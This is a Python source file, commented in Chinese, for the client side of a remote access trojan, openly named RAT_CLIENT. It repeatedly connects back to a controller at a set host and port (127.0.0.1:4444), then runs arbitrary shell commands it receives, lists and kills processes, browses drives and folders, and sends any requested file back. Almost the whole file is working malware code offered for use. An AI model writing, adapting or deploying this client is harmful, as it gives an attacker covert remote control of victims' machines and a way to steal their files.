'''
Decription: 客户端监控程序
Author : JFSAS
Date: 2024-12-4 23:02:00
'''
import socket
import os
import subprocess
import threading
import queue
import psutil
import time
from enum import Enum

# 应用层协议字段
class Command(Enum):
    SHELL = b'1'
    PROC = b'2'
    EXIT = b'3'
    FILE = b'4'
    
    
    



class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        self.on_client_connected = None
        self.send_buf = queue.Queue()
        self.shell = threading.Thread(target=self.run_shell)
        self.shell_buf = queue.Queue()
        self.shell.daemon = True
        self.proc = threading.Thread(target=self.proc_management)
        self.proc_buf = queue.Queue()
        self.file = threading.Thread(target=self.file_management)
        self.file_buf = queue.Queue()




    def build_connection(self):
        '''
        开启连接
        '''
        global s
        s = None
        # 重复请求连接，直到连接成功
        while s is None:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
            except Exception as e:
                s= None
        sending = socket.gethostbyname(socket.gethostname())
        s.send(sending.encode())
    
    
    
    def excute(self):
        '''
        开启多线程收发消息
        '''
        send_thread = threading.Thread(target=self.send_message)
        rev_thread = threading.Thread(target=self.recv_message)
        send_thread.start()
        rev_thread.start()
        send_thread.join()
        rev_thread.join()
        
    def send_message(self):
        while True:
            try:
                if self.send_buf.empty() is False:
                    msg = self.send_buf.get()
                    s.send(msg)
            except Exception as e:
                break
    
    def recv_message(self):
        command_handers = {
            Command.SHELL.value: self.handle_shell_command,
            Command.PROC.value: self.handle_proc_command,
            Command.EXIT.value: self.handle_exit_command,
            Command.FILE.value: self.handle_file_command,
        }
        while True:
            try:
                msg = s.recv(1024)
                command = msg[:1]
                handler = command_handers.get(command)
                handler(msg[1:])
            except Exception as e:
                break
            

    def handle_shell_command(self, command):
        '''
        处理shell命令
        '''
        if self.shell.is_alive() is False:
            self.shell.start()
        self.shell_buf.put(command)
        
        
    def handle_proc_command(self, command):
        if self.proc.is_alive() is False:
            self.proc.start()
        self.proc_buf.put(command)

    def handle_exit_command(self, command):
        self.send_buf.put('exit')
        self.shell.join()
        s.close()

    def handle_file_command(self, command):
        if self.file.is_alive() is False:
            self.file.start()
        self.file_buf.put(command)

        
    def run_shell(self):
        while True:
            if self.shell_buf.empty() is False:
                command = self.shell_buf.get().decode()
                if command == 'exit':
                    break
                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                msg = '1'
                if result.stdout:
                    msg += result.stdout
                if result.stderr:
                    msg += result.stderr
                self.send_buf.put(msg.encode())
                
    def proc_management(self):
        '''处理进程管理'''
        while True:
            if self.proc_buf.empty() is False:
                command = self.proc_buf.get().decode()
                if command.startswith("list"): #处理刷新进程信息
                    processes = self.list_processes()
                    response = "\n".join(f"{p['pid']}: {p['name']} (CPU: {p['cpu']}%, MEM: {p['memory']} MB, pwd: {p['pwd']})" for p in processes)
                    self.send_buf.put(Command.PROC.value + response.encode())
                    print(f"成功发送:{Command.PROC.value + response.encode()}")

                if command.startswith("kill"): #处理终止对应进程
                    print("yes")
                    temp = command[4:].strip(' ')
                    pid = int(temp)
                    kill_process = psutil.Process(pid)
                    print(pid)
                    kill_process.terminate()

      
    def list_processes(self): #获取当前进程信息
        '''获取当前进程信息'''
        processes = []
        pids = psutil.pids()
        for pid in pids: #遍历每一个进程号
            p = psutil.Process(pid)
            name = p.name()
            cpu_percent = p.cpu_percent()
            memory_info = p.memory_info().rss / (1024 * 1024)
            if pid == 0 :
                pwd = ''
            else:
                pwd = p.exe()
            processes.append({
                    'pid': pid, 'name': name, 'cpu': cpu_percent, 'memory': memory_info,'pwd': pwd })
        return processes        
        
                    
    def file_management(self):
        '''处理文件管理'''
        while True:
            if not self.file_buf.empty():
                command = self.file_buf.get().decode()
                if command == "start":  # 返回所有盘符
                    drives = [f"{d}:" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
                    response = "4" + "\n".join([f"{drive}| |Drive| " for drive in drives])
                    self.send_buf.put(response.encode())

                elif command.startswith("search"):  # 返回指定目录下文件信息
                    path = command[6:].strip()
                    try:
                        items = os.listdir(path)
                        response = "4"
                        for item in items:
                            item_path = os.path.join(path, item)
                            if os.path.isdir(item_path):
                                response += f"{item}| |folder| \n"
                            else:
                                try:
                                    size = os.path.getsize(item_path)
                                    response += f"{item}|{time.ctime(os.path.getmtime(item_path))}|file|{size}\n"
                                except:
                                    pass
                        self.send_buf.put(response.encode())
                        print(f"成功发送:{response.encode()}")
                    except Exception as e:
                        self.send_buf.put(f"4error:{str(e)}".encode())

                elif command.startswith("download"):  # 文件传输
                    file_path = command[8:].strip()
                    try:
                        with open(file_path, "rb") as f:
                            while chunk := f.read(1024):
                                self.send_buf.put(chunk)
                        self.send_buf.put("4Transfer_complete".encode())
                    except Exception as e:
                        self.send_buf.put(f"4error:{str(e)}".encode())
     



    
if __name__ == "__main__":
    host = "127.0.0.1"
    port = 4444
    rat = RAT_CLIENT(host, port)
    rat.build_connection()
    rat.excute()